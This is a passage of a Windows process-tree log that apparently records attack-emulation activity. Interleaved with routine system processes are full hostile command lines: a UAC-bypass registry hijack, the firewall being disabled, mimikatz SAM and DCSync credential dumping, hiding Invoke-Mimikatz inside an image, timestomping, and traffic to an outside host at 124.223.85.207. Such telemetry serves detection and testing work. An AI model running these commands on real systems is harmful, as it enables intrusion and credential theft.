+      └─ cvtres.exe (PID 18376): "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 "/OUT:C:\Users\ADMINI~1\AppData\Local\Temp\RES71A3.tmp" "c:\Users\Administrator\AppData\Local\Temp\pastxyu0\CSCDF17B31148334B29A56FE83E7DC9F9B8.TMP""
+    └─ csc.exe (PID 15528): ""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe" /noconfig /fullpaths @"C:\Users\Administrator\AppData\Local\Temp\da3tx22g\da3tx22g.cmdline""
+          wrote → C:\Users\Administrator\AppData\Local\Temp\da3tx22g\da3tx22g.dll
+      └─ cvtres.exe (PID 2000): "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 "/OUT:C:\Users\ADMINI~1\AppData\Local\Temp\RES1002.tmp" "c:\Users\Administrator\AppData\Local\Temp\da3tx22g\CSC321269AB77D444A79CFD3B8DB8DCF92.TMP""
+  └─ cmd.exe (PID 19320): ""cmd.exe" /c "echo "Hello from the Windows Command Prompt!" > "%TEMP%\test.bin" & type "%TEMP%\test.bin"""  [x3]
+  └─ cmd.exe (PID 17676): ""cmd.exe" /c "%LOCALAPPDATA:~-3,1%md /c echo Hello, from CMD! > hello.txt & type hello.txt""  [x3]
+    └─ cmd.exe (PID 6024): "cmd  /c echo Hello, from CMD!  "  [x3]
+  └─ powershell.exe (PID 9840): ""powershell.exe" & {cmd /c \""for /l %x in (1,1,75) do start wordpad.exe /p $env:temp\T1059_003note.txt\"" | out-null}"  [x3]
+        wrote → C:\Users\Administrator\AppData\Local\Temp\__PSScriptPolicyTest_oxk5wpt1.1i4.ps1
+        wrote → C:\Users\Administrator\AppData\Local\Temp\__PSScriptPolicyTest_vbea3knl.dc0.ps1
+        wrote → C:\Users\Administrator\AppData\Local\Temp\__PSScriptPolicyTest_dotmwubf.ws2.ps1
+    └─ csc.exe (PID 12928): ""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe" /noconfig /fullpaths @"C:\Users\Administrator\AppData\Local\Temp\mj4jj4lk\mj4jj4lk.cmdline""
+          wrote → C:\Users\Administrator\AppData\Local\Temp\mj4jj4lk\mj4jj4lk.dll
+      └─ cvtres.exe (PID 16148): "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 "/OUT:C:\Users\ADMINI~1\AppData\Local\Temp\RES9552.tmp" "c:\Users\Administrator\AppData\Local\Temp\mj4jj4lk\CSC1A9E50EC602B4BBD868188C141A8AD8.TMP""
+    └─ cmd.exe (PID 14916): ""C:\WINDOWS\system32\cmd.exe" /c "for /l %x in (1,1,75) do start wordpad.exe /p C:\Users\ADMINI~1\AppData\Local\Temp\T1059_003note.txt""  [x3]
+      └─ wordpad.exe (PID 272): ""C:\Program Files\Windows NT\Accessories\wordpad.exe"  /p C:\Users\ADMINI~1\AppData\Local\Temp\T1059_003note.txt"  [x225]
+    └─ csc.exe (PID 11492): ""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe" /noconfig /fullpaths @"C:\Users\Administrator\AppData\Local\Temp\nm3krtap\nm3krtap.cmdline""
+          wrote → C:\Users\Administrator\AppData\Local\Temp\nm3krtap\nm3krtap.dll
+      └─ cvtres.exe (PID 11372): "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 "/OUT:C:\Users\ADMINI~1\AppData\Local\Temp\RES74DF.tmp" "c:\Users\Administrator\AppData\Local\Temp\nm3krtap\CSC72EBEF9F747241B49593E829F3C2C33E.TMP""
+    └─ csc.exe (PID 11320): ""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe" /noconfig /fullpaths @"C:\Users\Administrator\AppData\Local\Temp\qjp20zxs\qjp20zxs.cmdline""
+          wrote → C:\Users\Administrator\AppData\Local\Temp\qjp20zxs\qjp20zxs.dll
+      └─ cvtres.exe (PID 19220): "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 "/OUT:C:\Users\ADMINI~1\AppData\Local\Temp\RES1300.tmp" "c:\Users\Administrator\AppData\Local\Temp\qjp20zxs\CSC60798673BFFA4094B711D1CB11B181BA.TMP""
+  └─ csc.exe (PID 7980): ""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe" /noconfig /fullpaths @"C:\Users\Administrator\AppData\Local\Temp\4rtcwqno\4rtcwqno.cmdline""
+        wrote → C:\Users\Administrator\AppData\Local\Temp\4rtcwqno\4rtcwqno.dll
+    └─ cvtres.exe (PID 8180): "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 "/OUT:C:\Users\ADMINI~1\AppData\Local\Temp\RES68E9.tmp" "c:\Users\Administrator\AppData\Local\Temp\4rtcwqno\CSC44A24CE6AB3B4C21974CBD4986CDCCD4.TMP""
+  └─ csc.exe (PID 17232): ""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe" /noconfig /fullpaths @"C:\Users\Administrator\AppData\Local\Temp\1cvhbh4w\1cvhbh4w.cmdline""
+        wrote → C:\Users\Administrator\AppData\Local\Temp\1cvhbh4w\1cvhbh4w.dll
+    └─ cvtres.exe (PID 8968): "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 "/OUT:C:\Users\ADMINI~1\AppData\Local\Temp\RES738.tmp" "c:\Users\Administrator\AppData\Local\Temp\1cvhbh4w\CSC82CF2ADD1F174042BDDBF02542943F1F.TMP""
+cmd.exe (PID 18448): "cmd.exe /C T1059.006.py"  [x3]
+  └─ py.exe (PID 13120): ""C:\WINDOWS\py.exe" "C:\Users\Administrator\Desktop\shell\T1059.006.py" "  [x3]
+    └─ python.exe (PID 6464): "C:\Users\Administrator\AppData\Local\Programs\Python\Python37\python.exe "C:\Users\Administrator\Desktop\shell\T1059.006.py" "  [x3]
+      └─ cmd.exe (PID 15544): "C:\WINDOWS\system32\cmd.exe /c Netsh Advfirewall show allprofiles &  NetSh Advfirewall?set?allprofiles state off & echo ����ǽ�ѹر�& pause"  [x3]
+        └─ netsh.exe (PID 18236): "Netsh  Advfirewall show allprofiles "  [x3]
+        └─ netsh.exe (PID 18964): "NetSh  Advfirewall?set?allprofiles state off "  [x3]
+backgroundTaskHost.exe (PID 1676): ""C:\WINDOWS\system32\backgroundTaskHost.exe" -ServerName:CortanaUI.AppX3bn25b6f886wmg6twh46972vprk9tnbf.mca" PackageFullName="Microsoft.Windows.Search_1.14.3.19041_neutral_neutral_cw5n1h2txyewy" ApplicationID="CortanaUI"  [x2]
+      connected to → 202.89.233.100:443
+WUDFHost.exe (PID 2756): ""C:\Windows\System32\WUDFHost.exe" -HostGUID:{193a1820-d9ac-4997-8c55-be817523f6aa} -IoEventPortName:\UMDFCommunicationPorts\WUDF\HostProcess-9f39e382-1d70-4c4b-8a1f-0512a7ab5cc1 -SystemEventPortName:\UMDFCommunicationPorts\WUDF\HostProcess-07529987-f79b-493c-8033-e549e13edc1b -IoCancelEventPortName:\UMDFCommunicationPorts\WUDF\HostProcess-95084b5b-cdea-454a-b5ad-810ec2308b94 -NonStateChangingEventPortName:\UMDFCommunicationPorts\WUDF\HostProcess-ed17bbf5-8e96-4b56-8e34-cfef97471d9e -LifetimeId:405c63cb-50a"
+cmd.exe (PID 10532): "C:\windows\system32\cmd.exe atbroker.exe"  [x2]
+  └─ taskkill.exe (PID 12224): "taskkill  /f /im wordpad.exe"  [x2]
+dllhost.exe (PID 13360): ""C:\WINDOWS\SysWOW64\DllHost.exe" /Processid:{776DBC8D-7347-478C-8D71-791E12EF49D8}" PackageFullName="Microsoft.SkypeApp_15.82.404.0_x86__kzf8qxf38zg5c" ApplicationID="App"  [x3]
+consent.exe (PID 18532): "consent.exe 8308 288 0000024DDEC54D00"
+cmd.exe (PID 8364): ""C:\WINDOWS\system32\cmd.exe" "  [x2]
+  └─ cmd.exe (PID 2676): "cmd  /c start /min sangforcat.exe -v -server https://124.223.85.207:8443"  [x3]
+    └─ sangforcat.exe (PID 12284): "sangforcat.exe  -v -server https://124.223.85.207:8443"  [x4]
+          connected to → 124.223.85.207:8443
+          wrote → C:\Users\Administrator\Desktop\shell\HookSSLX64.dll
+      └─ powershell.exe (PID 18924): "powershell.exe -ExecutionPolicy Bypass -C "Invoke-AtomicTest T1548.002 -TestNumbers 2""  [x2]
+            wrote → C:\Users\Administrator\AppData\Local\Temp\__PSScriptPolicyTest_rjfl4lgp.f0q.ps1
+            wrote → C:\Users\Administrator\AppData\Local\Temp\__PSScriptPolicyTest_o13titb1.2g2.ps1
+        └─ csc.exe (PID 15564): ""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe" /noconfig /fullpaths @"C:\Users\Administrator\AppData\Local\Temp\51qsfzqa\51qsfzqa.cmdline""
+              wrote → C:\Users\Administrator\AppData\Local\Temp\51qsfzqa\51qsfzqa.dll
+          └─ cvtres.exe (PID 772): "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 "/OUT:C:\Users\ADMINI~1\AppData\Local\Temp\RES1E88.tmp" "c:\Users\Administrator\AppData\Local\Temp\51qsfzqa\CSC4D7AD60BD947B498E0485C7A41D48.TMP""
+        └─ powershell.exe (PID 10540): ""powershell.exe" & {New-Item \""HKCU:\software\classes\mscfile\shell\open\command\"" -Force Set-ItemProperty \""HKCU:\software\classes\mscfile\shell\open\command\"" -Name \""(default)\"" -Value \""C:\Windows\System32\cmd.exe\"" -Force Start-Process \""C:\Windows\System32\eventvwr.msc\""}"  [x4]
+              wrote → C:\Users\Administrator\AppData\Local\Temp\__PSScriptPolicyTest_f43igcy0.zfo.ps1
+              wrote → C:\Users\Administrator\AppData\Local\Temp\__PSScriptPolicyTest_kbhn1ja0.wde.ps1
+              wrote → C:\Users\Administrator\AppData\Local\Temp\__PSScriptPolicyTest_nrfjhsla.e1v.ps1
+              wrote → C:\Users\Administrator\AppData\Local\Temp\__PSScriptPolicyTest_eujjdmic.lph.ps1
+          └─ csc.exe (PID 13104): ""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe" /noconfig /fullpaths @"C:\Users\Administrator\AppData\Local\Temp\rpt1mjzw\rpt1mjzw.cmdline""
+                wrote → C:\Users\Administrator\AppData\Local\Temp\rpt1mjzw\rpt1mjzw.dll
+            └─ cvtres.exe (PID 10576): "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 "/OUT:C:\Users\ADMINI~1\AppData\Local\Temp\RES2406.tmp" "c:\Users\Administrator\AppData\Local\Temp\rpt1mjzw\CSCE5FCEABF534B4408BBE3482E3D851150.TMP""
+          └─ cmd.exe (PID 6036): ""C:\Windows\System32\cmd.exe" "  [x12]
+            └─ taskkill.exe (PID 17332): "taskkill  /f /pid wordpad.exe"
+            └─ tasklist.exe (PID 6348): "tasklist  "
+            └─ findstr.exe (PID 13516): "findstr  sangforcat"
+            └─ taskkill.exe (PID 16420): "taskkill  /f /im sangforcat.exe"
+          └─ csc.exe (PID 6572): ""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe" /noconfig /fullpaths @"C:\Users\Administrator\AppData\Local\Temp\denamjbs\denamjbs.cmdline""
+                wrote → C:\Users\Administrator\AppData\Local\Temp\denamjbs\denamjbs.dll
+            └─ cvtres.exe (PID 17932): "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 "/OUT:C:\Users\ADMINI~1\AppData\Local\Temp\RESC72C.tmp" "c:\Users\Administrator\AppData\Local\Temp\denamjbs\CSC4BB4C0E9AD224EA893D3BB1A41F22CE5.TMP""
+          └─ csc.exe (PID 10728): ""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe" /noconfig /fullpaths @"C:\Users\Administrator\AppData\Local\Temp\h2j3nndj\h2j3nndj.cmdline""
+                wrote → C:\Users\Administrator\AppData\Local\Temp\h2j3nndj\h2j3nndj.dll
+            └─ cvtres.exe (PID 572): "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 "/OUT:C:\Users\ADMINI~1\AppData\Local\Temp\RESDD30.tmp" "c:\Users\Administrator\AppData\Local\Temp\h2j3nndj\CSC9E0C069396624A6CAB31609E6FCABA6C.TMP""
+          └─ csc.exe (PID 12544): ""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe" /noconfig /fullpaths @"C:\Users\Administrator\AppData\Local\Temp\s20c401u\s20c401u.cmdline""
+                wrote → C:\Users\Administrator\AppData\Local\Temp\s20c401u\s20c401u.dll
+            └─ cvtres.exe (PID 16064): "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 "/OUT:C:\Users\ADMINI~1\AppData\Local\Temp\RES8008.tmp" "c:\Users\Administrator\AppData\Local\Temp\s20c401u\CSC6E7B90F8FB324D28AFB6A37E45D61A57.TMP""
+        └─ csc.exe (PID 1864): ""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe" /noconfig /fullpaths @"C:\Users\Administrator\AppData\Local\Temp\nh412ui3\nh412ui3.cmdline""
+              wrote → C:\Users\Administrator\AppData\Local\Temp\nh412ui3\nh412ui3.dll
+          └─ cvtres.exe (PID 17872): "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 "/OUT:C:\Users\ADMINI~1\AppData\Local\Temp\RESD793.tmp" "c:\Users\Administrator\AppData\Local\Temp\nh412ui3\CSCB6D6E4C4514E462593EAEC4C154EBB0.TMP""
+      └─ powershell.exe (PID 15416): "powershell.exe -ExecutionPolicy Bypass -C "Invoke-AtomicTest T1546.008 -TestNumbers 1 -Cleanup""  [x2]
+            wrote → C:\Users\Administrator\AppData\Local\Temp\__PSScriptPolicyTest_x4btyd0m.gny.ps1
+            wrote → C:\Users\Administrator\AppData\Local\Temp\__PSScriptPolicyTest_kfj44wei.ens.ps1
+        └─ csc.exe (PID 8720): ""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe" /noconfig /fullpaths @"C:\Users\Administrator\AppData\Local\Temp\0g4kcuyi\0g4kcuyi.cmdline""
+              wrote → C:\Users\Administrator\AppData\Local\Temp\0g4kcuyi\0g4kcuyi.dll
+          └─ cvtres.exe (PID 14504): "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 "/OUT:C:\Users\ADMINI~1\AppData\Local\Temp\RES75FF.tmp" "c:\Users\Administrator\AppData\Local\Temp\0g4kcuyi\CSCC66834574E8A43B88B7455A674DCC53.TMP""
+        └─ powershell.exe (PID 732): ""powershell.exe" & {$input_table = \""osk.exe, sethc.exe, utilman.exe, magnify.exe, narrator.exe, DisplaySwitch.exe, atbroker.exe\"".split(\"",\"")Foreach ($item in $input_table){$item = $item.trim()reg delete \""HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\$item\"" /v Debugger /f 2>&1 | Out-Null}}"  [x2]
+              wrote → C:\Users\Administrator\AppData\Local\Temp\__PSScriptPolicyTest_iq4ssre1.lpr.ps1
+              wrote → C:\Users\Administrator\AppData\Local\Temp\__PSScriptPolicyTest_le3yhuin.cgi.ps1
+          └─ csc.exe (PID 16224): ""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe" /noconfig /fullpaths @"C:\Users\Administrator\AppData\Local\Temp\tgwhsatw\tgwhsatw.cmdline""
+                wrote → C:\Users\Administrator\AppData\Local\Temp\tgwhsatw\tgwhsatw.dll
+            └─ cvtres.exe (PID 5908): "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 "/OUT:C:\Users\ADMINI~1\AppData\Local\Temp\RES79E7.tmp" "c:\Users\Administrator\AppData\Local\Temp\tgwhsatw\CSCE4BB4AE931F84B3A9642ED7310EAA819.TMP""
+          └─ reg.exe (PID 15664): ""C:\WINDOWS\system32\reg.exe" delete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\osk.exe" /v Debugger /f"  [x2]
+          └─ reg.exe (PID 10572): ""C:\WINDOWS\system32\reg.exe" delete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /f"  [x2]
+          └─ reg.exe (PID 15444): ""C:\WINDOWS\system32\reg.exe" delete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe" /v Debugger /f"  [x2]
+          └─ reg.exe (PID 5204): ""C:\WINDOWS\system32\reg.exe" delete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\magnify.exe" /v Debugger /f"  [x2]
+          └─ reg.exe (PID 16968): ""C:\WINDOWS\system32\reg.exe" delete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\narrator.exe" /v Debugger /f"  [x2]
+          └─ reg.exe (PID 6040): ""C:\WINDOWS\system32\reg.exe" delete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\DisplaySwitch.exe" /v Debugger /f"  [x2]
+          └─ reg.exe (PID 14000): ""C:\WINDOWS\system32\reg.exe" delete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\atbroker.exe" /v Debugger /f"  [x2]
+          └─ csc.exe (PID 17800): ""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe" /noconfig /fullpaths @"C:\Users\Administrator\AppData\Local\Temp\1010do5u\1010do5u.cmdline""
+                wrote → C:\Users\Administrator\AppData\Local\Temp\1010do5u\1010do5u.dll
+            └─ cvtres.exe (PID 10844): "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 "/OUT:C:\Users\ADMINI~1\AppData\Local\Temp\RES3255.tmp" "c:\Users\Administrator\AppData\Local\Temp\1010do5u\CSCF965A6D47D4545D8B7E3F0D898E351B0.TMP""
+        └─ csc.exe (PID 19116): ""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe" /noconfig /fullpaths @"C:\Users\Administrator\AppData\Local\Temp\zve2q0zq\zve2q0zq.cmdline""
+              wrote → C:\Users\Administrator\AppData\Local\Temp\zve2q0zq\zve2q0zq.dll
+          └─ cvtres.exe (PID 13456): "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 "/OUT:C:\Users\ADMINI~1\AppData\Local\Temp\RES2E5E.tmp" "c:\Users\Administrator\AppData\Local\Temp\zve2q0zq\CSCF21198D180C94F80A6972BCE795495C9.TMP""
+      └─ cmd.exe (PID 208): "cmd.exe /C "certutil.exe -decode a.txt b.txt""  [x2]
+        └─ certutil.exe (PID 13516): "certutil.exe  -decode a.txt b.txt"  [x2]
+      └─ cmd.exe (PID 4968): "cmd.exe /C "del /f /q b.txt""  [x2]
+      └─ powershell.exe (PID 9088): "powershell.exe -ExecutionPolicy Bypass -C "mkdir timestomp ; echo ipconfig /all > timestomp/timestomp.txt ; (ls timestomp).LastWriteTime=��2020-10-10 12:12:12��""  [x2]
+            wrote → C:\Users\Administrator\AppData\Local\Temp\__PSScriptPolicyTest_10z433lz.se4.ps1
+            wrote → C:\Users\Administrator\AppData\Local\Temp\__PSScriptPolicyTest_fj2gman2.33r.ps1
+        └─ csc.exe (PID 15212): ""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe" /noconfig /fullpaths @"C:\Users\Administrator\AppData\Local\Temp\btgu5rm3\btgu5rm3.cmdline""
+              wrote → C:\Users\Administrator\AppData\Local\Temp\btgu5rm3\btgu5rm3.dll
+          └─ cvtres.exe (PID 8460): "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 "/OUT:C:\Users\ADMINI~1\AppData\Local\Temp\RES394F.tmp" "c:\Users\Administrator\AppData\Local\Temp\btgu5rm3\CSC5C918714F86648FB963EB37D79B9F36D.TMP""
+        └─ csc.exe (PID 5228): ""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe" /noconfig /fullpaths @"C:\Users\Administrator\AppData\Local\Temp\wxrm2dfn\wxrm2dfn.cmdline""
+              wrote → C:\Users\Administrator\AppData\Local\Temp\wxrm2dfn\wxrm2dfn.dll
+          └─ cvtres.exe (PID 14772): "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 "/OUT:C:\Users\ADMINI~1\AppData\Local\Temp\RESF21B.tmp" "c:\Users\Administrator\AppData\Local\Temp\wxrm2dfn\CSCC5C461EA89754C1BB415E494BDE1C81A.TMP""
+      └─ cmd.exe (PID 2304): "cmd.exe /C "rm /s /q timestomp""  [x2]
+      └─ cmd.exe (PID 10096): "cmd.exe /C "rundll32 user32.dll,LockWorkStation""  [x2]
+        └─ rundll32.exe (PID 7980): "rundll32  user32.dll,LockWorkStation"  [x2]
+      └─ cmd.exe (PID 5092): "cmd.exe /C "mimikatz2.exe  lsadump::sam exit""  [x2]
+        └─ mimikatz2.exe (PID 15948): "mimikatz2.exe   lsadump::sam exit"  [x2]
+      └─ cmd.exe (PID 10356): "cmd.exe /C "net localgroup""  [x2]
+        └─ net.exe (PID 5308): "net  localgroup"  [x2]
+          └─ net1.exe (PID 9372): "C:\WINDOWS\system32\net1  localgroup"  [x2]
+      └─ cmd.exe (PID 4860): "cmd.exe /C "nltest /domain_trusts""
+        └─ nltest.exe (PID 17768): "nltest  /domain_trusts"
+      └─ cmd.exe (PID 16444): "cmd.exe /C "mimikatz.exe  LSADUMP::DCSync exit""
+        └─ mimikatz.exe (PID 16560): "mimikatz.exe   LSADUMP::DCSync exit"
+      └─ powershell.exe (PID 11504): "powershell.exe -ExecutionPolicy Bypass -C "Invoke-WebRequest http://124.223.85.207:8082/Test.hta -Method 'POST' -UseBasicParsing -ContentType \"application/json\"""
+            wrote → C:\Users\Administrator\AppData\Local\Temp\__PSScriptPolicyTest_m2q1bu4v.rl2.ps1
+            connected to → 124.223.85.207:8082
+        └─ csc.exe (PID 10304): ""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe" /noconfig /fullpaths @"C:\Users\Administrator\AppData\Local\Temp\dbyj23mg\dbyj23mg.cmdline""
+              wrote → C:\Users\Administrator\AppData\Local\Temp\dbyj23mg\dbyj23mg.dll
+          └─ cvtres.exe (PID 5764): "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 "/OUT:C:\Users\ADMINI~1\AppData\Local\Temp\RES503F.tmp" "c:\Users\Administrator\AppData\Local\Temp\dbyj23mg\CSC283EEFD9834648B68114975416AD47C9.TMP""
+      └─ powershell.exe (PID 16872): "powershell.exe -ExecutionPolicy Bypass -C "Import-Module .\Invoke-PSImage.ps1;Invoke-PSImage -Script .\Invoke-Mimikatz.ps1 -Out .\evil-kiwi.png -Image .\995647.jpg""
+            wrote → C:\Users\Administrator\AppData\Local\Temp\__PSScriptPolicyTest_dhhweusm.jug.ps1
+        └─ csc.exe (PID 15612): ""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe" /noconfig /fullpaths @"C:\Users\Administrator\AppData\Local\Temp\caehc2gf\caehc2gf.cmdline""
+              wrote → C:\Users\Administrator\AppData\Local\Temp\caehc2gf\caehc2gf.dll
+          └─ cvtres.exe (PID 8916): "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 "/OUT:C:\Users\ADMINI~1\AppData\Local\Temp\RES7859.tmp" "c:\Users\Administrator\AppData\Local\Temp\caehc2gf\CSC3AF8FCB8780B4BEFA8E2FA923493DEF5.TMP""
+      └─ cmd.exe (PID 11828): "cmd.exe /C "netsh interface portproxy add v4tov4 listenport=65535 connectaddress=127.0.0.1 connectport=22 listenaddress=127.0.0.1 protocol=tcp""
+        └─ netsh.exe (PID 16864): "netsh  interface portproxy add v4tov4 listenport=65535 connectaddress=127.0.0.1 connectport=22 listenaddress=127.0.0.1 protocol=tcp"
+      └─ cmd.exe (PID 3324): "cmd.exe /C tor.lnk"
+consent.exe (PID 19024): "consent.exe 8308 288 0000024DDEC54440"
+cmd.exe (PID 11396): ""cmd.exe" /c notepad.exe"  [x3]
+  └─ notepad.exe (PID 13488): "notepad.exe"  [x3]
+dllhost.exe (PID 18492): "C:\WINDOWS\SysWOW64\DllHost.exe /Processid:{06622D85-6856-4460-8DE1-A81921B41C4B}"  [x2]
+cmd.exe (PID 6800): "cmd /c start powershell&REM \system32\cleanmgr.exe /autoclean /d C:"  [x2]
+  └─ powershell.exe (PID 17644): "powershell "  [x2]
+        wrote → C:\Users\Administrator\AppData\Local\Temp\__PSScriptPolicyTest_nfsalhd4.hxc.ps1
+        wrote → C:\Users\Administrator\AppData\Local\Temp\__PSScriptPolicyTest_ea0wiwgm.e5e.ps1
+    └─ csc.exe (PID 12048): ""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe" /noconfig /fullpaths @"C:\Users\Administrator\AppData\Local\Temp\x2k00vdy\x2k00vdy.cmdline""
+          wrote → C:\Users\Administrator\AppData\Local\Temp\x2k00vdy\x2k00vdy.dll
+      └─ cvtres.exe (PID 14004): "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 "/OUT:C:\Users\ADMINI~1\AppData\Local\Temp\RESE18A.tmp" "c:\Users\Administrator\AppData\Local\Temp\x2k00vdy\CSC96AD78591E604777BA2118C36FAA3B68.TMP""
+    └─ csc.exe (PID 8632): ""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe" /noconfig /fullpaths @"C:\Users\Administrator\AppData\Local\Temp\cnuphsze\cnuphsze.cmdline""
+          wrote → C:\Users\Administrator\AppData\Local\Temp\cnuphsze\cnuphsze.dll
+      └─ cvtres.exe (PID 8408): "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 "/OUT:C:\Users\ADMINI~1\AppData\Local\Temp\RES9A56.tmp" "c:\Users\Administrator\AppData\Local\Temp\cnuphsze\CSCFB1E4D6DED794D679351A82222CD8D2.TMP""
+SearchProtocolHost.exe (PID 12344): ""C:\WINDOWS\system32\SearchProtocolHost.exe" Global\UsGthrFltPipeMssGthrPipe29_ Global\UsGthrCtrlFltPipeMssGthrPipe29 1 -2147483646 "Software\Microsoft\Windows Search" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT; MS Search 4.0 Robot)" "C:\ProgramData\Microsoft\Search\Data\Temp\usgthrsvc" "DownLevelDaemon" "
+LogonUI.exe (PID 15636): ""LogonUI.exe" /flags:0x0 /state0:0xa34c5055 /state1:0x41c64e6d"
+RuntimeBroker.exe (PID 8104): "C:\Windows\System32\RuntimeBroker.exe -Embedding" PackageFullName="Microsoft.WindowsCalculator_10.2103.8.0_x64__8wekyb3d8bbwe" ApplicationID="runtimebroker07f4358a809ac99a64a67c1"
+SearchProtocolHost.exe (PID 14684): ""C:\WINDOWS\system32\SearchProtocolHost.exe" Global\UsGthrFltPipeMssGthrPipe30_ Global\UsGthrCtrlFltPipeMssGthrPipe30 1 -2147483646 "Software\Microsoft\Windows Search" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT; MS Search 4.0 Robot)" "C:\ProgramData\Microsoft\Search\Data\Temp\usgthrsvc" "DownLevelDaemon" "
+taskhostw.exe (PID 10680): "taskhostw.exe Event"
+SearchProtocolHost.exe (PID 12408): ""C:\WINDOWS\system32\SearchProtocolHost.exe" Global\UsGthrFltPipeMssGthrPipe31_ Global\UsGthrCtrlFltPipeMssGthrPipe31 1 -2147483646 "Software\Microsoft\Windows Search" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT; MS Search 4.0 Robot)" "C:\ProgramData\Microsoft\Search\Data\Temp\usgthrsvc" "DownLevelDaemon" "
+rundll32.exe (PID 3548): "C:\WINDOWS\system32\rundll32.exe C:\WINDOWS\system32\PcaSvc.dll,PcaPatchSdbTask"  [x2]
+      connected to → 52.140.118.28:443
+      connected to → 40.74.108.123:443
+LogonUI.exe (PID 14324): ""LogonUI.exe" /flags:0x0 /state0:0xa2bcd855 /state1:0x41c64e6d"
+WUDFHost.exe (PID 6052): ""C:\Windows\System32\WUDFHost.exe" -HostGUID:{193a1820-d9ac-4997-8c55-be817523f6aa} -IoEventPortName:\UMDFCommunicationPorts\WUDF\HostProcess-33c574da-2f2a-4dd4-9644-f0907cc368d4 -SystemEventPortName:\UMDFCommunicationPorts\WUDF\HostProcess-20677623-69a6-407f-ac1c-a0693eed1ba6 -IoCancelEventPortName:\UMDFCommunicationPorts\WUDF\HostProcess-a666046a-5ea0-4fe5-a012-60ad29a668ef -NonStateChangingEventPortName:\UMDFCommunicationPorts\WUDF\HostProcess-1e102092-8340-4f2e-ac11-724f3c780a40 -LifetimeId:cd9efc39-c1f"
